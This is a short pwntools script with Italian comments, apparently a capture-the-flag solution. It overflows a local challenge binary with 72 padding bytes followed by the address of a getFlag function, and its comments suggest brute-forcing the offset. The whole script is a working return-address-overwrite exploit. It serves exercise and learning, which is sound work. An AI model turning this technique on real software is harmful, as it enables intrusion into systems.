### Buff overflow con l'inserimento di un indirizzo di funzione per chiamare getFlag

import pwn
p = pwn.process("./bluff_overflow.exe")
elf = pwn.ELF("./bluff_overflow.exe")
p.sendline(b"A"*(72)+pwn.p64(elf.symbols["getFlag"]))
p.interactive()

## oppure al posto di p.interactive msg=p.recvall()
## print(msg)

## al posto di 72 è l'offset, si può andare di brute force
## for i in range(50,100)
## ....
## p.sendline(b"A"*(i)+pwn.p64(elf.symbols["getFlag"]))